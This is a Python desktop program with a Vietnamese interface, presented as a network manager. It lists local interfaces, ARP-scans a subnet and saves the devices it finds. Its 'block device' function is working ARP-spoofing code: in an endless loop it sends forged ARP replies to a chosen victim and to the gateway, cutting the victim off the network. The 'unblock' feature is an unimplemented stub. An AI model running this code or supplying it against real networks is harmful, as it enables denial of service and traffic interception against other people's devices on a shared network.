import tkinter as tk
from tkinter import messagebox, scrolledtext
import threading
import scapy.all as scapy
from scapy.layers.l2 import ARP, Ether, srp
from scapy.sendrecv import sendp
import socket
import psutil
import time

# Các hàm chính

def get_active_network_info():
    active_interfaces = psutil.net_if_stats()
    net_io = psutil.net_if_addrs()
    info = ""
    for interface, stats in active_interfaces.items():
        if stats.isup:
            for addr in net_io[interface]:
                if addr.family == socket.AF_INET:
                    info += f"Interface: {interface}\n"
                    info += f"IP: {addr.address}\n"
                    info += f"Netmask: {addr.netmask}\n\n"
    return info

def scan_network(ip_range):
    arp = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp
    result = srp(packet, timeout=3, verbose=0)[0]
    devices = [{'ip': received.psrc, 'mac': received.hwsrc} for sent, received in result]
    return devices

def save_devices_to_file(devices):
    with open("network_devices.txt", "w") as file:
        for device in devices:
            file.write(f"IP Address: {device['ip']}, MAC Address: {device['mac']}\n")

def block_device(ip_address, mac_address, gateway_ip):
    gateway_mac = get_mac(gateway_ip)
    if not gateway_mac:
        return "Không tìm thấy địa chỉ MAC của gateway."

    blocking = True
    while blocking:
        packet_victim = Ether(dst=mac_address) / ARP(op=2, pdst=ip_address, psrc=gateway_ip, hwdst=mac_address)
        packet_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, psrc=ip_address, hwdst=gateway_mac)
        sendp(packet_victim, verbose=0)
        sendp(packet_gateway, verbose=0)
        time.sleep(2)

    return f"Đã chặn thiết bị với IP {ip_address} và MAC {mac_address}."

def unblock_devices():
    return "Tính năng bỏ chặn hiện chưa được triển khai."

def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=0)
    for snd, rcv in ans:
        return rcv[Ether].src
    return None

# Hàm xử lý giao diện

def show_network_info():
    info = get_active_network_info()
    output_box.delete(1.0, tk.END)
    output_box.insert(tk.END, info)

def scan():
    ip_range = ip_entry.get()
    if not ip_range:
        messagebox.showwarning("Cảnh báo", "Hãy nhập phạm vi IP!")
        return
    devices = scan_network(ip_range)
    output_box.delete(1.0, tk.END)
    output_box.insert(tk.END, "Devices found:\n")
    for device in devices:
        output_box.insert(tk.END, f"IP: {device['ip']}, MAC: {device['mac']}\n")
    save_devices_to_file(devices)

def block():
    ip = ip_entry.get()
    mac = mac_entry.get()
    gateway_ip = gateway_entry.get()
    if not ip or not mac or not gateway_ip:
        messagebox.showwarning("Cảnh báo", "Hãy nhập đầy đủ địa chỉ IP, MAC và Gateway!")
        return
    threading.Thread(target=block_device, args=(ip, mac, gateway_ip)).start()
    messagebox.showinfo("Thông báo", f"Đã bắt đầu chặn thiết bị IP: {ip}, MAC: {mac}")

def unblock():
    result = unblock_devices()
    messagebox.showinfo("Thông báo", result)

# Giao diện chính

root = tk.Tk()
root.title("Quản lý mạng")
root.geometry("800x600")
root.configure(bg="#2e2e2e")

# Các thành phần giao diện
frame_top = tk.Frame(root, bg="#2e2e2e")
frame_top.pack(pady=10)

btn_info = tk.Button(frame_top, text="Thông tin mạng", command=show_network_info, bg="#4e4e4e", fg="white")
btn_info.grid(row=0, column=0, padx=5)

btn_scan = tk.Button(frame_top, text="Quét mạng", command=scan, bg="#4e4e4e", fg="white")
btn_scan.grid(row=0, column=1, padx=5)

btn_block = tk.Button(frame_top, text="Chặn thiết bị", command=block, bg="#4e4e4e", fg="white")
btn_block.grid(row=0, column=2, padx=5)

btn_unblock = tk.Button(frame_top, text="Bỏ chặn thiết bị", command=unblock, bg="#4e4e4e", fg="white")
btn_unblock.grid(row=0, column=3, padx=5)

frame_middle = tk.Frame(root, bg="#2e2e2e")
frame_middle.pack(pady=10)

tk.Label(frame_middle, text="Phạm vi IP:", bg="#2e2e2e", fg="white").grid(row=0, column=0, padx=5, sticky="w")
ip_entry = tk.Entry(frame_middle, width=30, bg="#4e4e4e", fg="white", insertbackground="white")
ip_entry.grid(row=0, column=1, padx=5)

tk.Label(frame_middle, text="Địa chỉ MAC:", bg="#2e2e2e", fg="white").grid(row=1, column=0, padx=5, sticky="w")
mac_entry = tk.Entry(frame_middle, width=30, bg="#4e4e4e", fg="white", insertbackground="white")
mac_entry.grid(row=1, column=1, padx=5)

tk.Label(frame_middle, text="Gateway IP:", bg="#2e2e2e", fg="white").grid(row=2, column=0, padx=5, sticky="w")
gateway_entry = tk.Entry(frame_middle, width=30, bg="#4e4e4e", fg="white", insertbackground="white")
gateway_entry.grid(row=2, column=1, padx=5)

frame_bottom = tk.Frame(root, bg="#2e2e2e")
frame_bottom.pack(pady=10)

output_box = scrolledtext.ScrolledText(frame_bottom, width=90, height=25, bg="#4e4e4e", fg="white", insertbackground="white")
output_box.pack()

# Chạy giao diện
root.mainloop()
